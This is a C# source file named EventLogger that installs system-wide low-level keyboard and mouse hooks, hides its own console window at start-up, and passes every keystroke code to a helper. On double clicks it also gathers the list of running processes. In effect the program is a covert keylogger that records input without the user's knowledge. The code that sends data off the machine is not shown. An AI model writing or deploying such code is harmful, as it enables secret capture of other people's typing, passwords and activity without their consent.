using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime.CompilerServices;

namespace EventLogger;

class EventLogger
{
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);
 
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
 
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    private static IntPtr _keyboardHook = IntPtr.Zero;
    private static IntPtr _mouseHook = IntPtr.Zero;
    
    private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
 
    public static void Main()
    {
        var handle = GetConsoleWindow();
        // Hide
        ShowWindow(handle, 0);
        var process = Process.GetCurrentProcess();
        
        _keyboardHook = SetHandler(process.MainModule,(LowLevelProc)KeyBoardHandler, Utils.WH_KEYBOARD_LL);
        _mouseHook = SetHandler(process.MainModule, (LowLevelProc)MouseHandler,Utils.WH_MOUSE_LL);
        
        Application.Run();
        
        UnhookWindowsHookEx(_keyboardHook);
        UnhookWindowsHookEx(_mouseHook);
        
    }
 
    private static IntPtr SetHandler(ProcessModule? module, LowLevelProc handler, int action)
    {
        return SetWindowsHookEx(action, handler, GetModuleHandle(module.ModuleName), 0);
    }

    private static DateTime previousTime = DateTime.Now;
    private static IntPtr MouseHandler(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if(wParam==(IntPtr)Utils.WM_LBUTTONDOWN)
        {
            //check if previousTime and Datetime.Now is more than 500 milliseconds
            if(DateTime.Now.Subtract(previousTime).TotalMilliseconds<=500)
            {
                Console.WriteLine("[Double-Mouse] Left button down");
                Utils.CollectProcess(Process.GetProcesses());
            }
            else
            {
                Console.WriteLine("[Mouse] Left button down");
            }
            previousTime = DateTime.Now;
        }
        else if (wParam == (IntPtr)Utils.WM_RBUTTONDOWN) {
            Console.WriteLine("[Mouse] Right button down");
        }
        return CallNextHookEx(_mouseHook, nCode, wParam, lParam);
    }
    private static IntPtr KeyBoardHandler(int nCode, IntPtr wParam, IntPtr lParam)
    {
        //Keyboard event
        if (wParam == (IntPtr)Utils.WM_KEYDOWN || wParam!=(IntPtr)Utils.WM_KEYUP){
            Utils.TransformInt((int)Marshal.ReadInt32(lParam));
        }
        return CallNextHookEx(_keyboardHook, nCode, wParam, lParam);
    }
}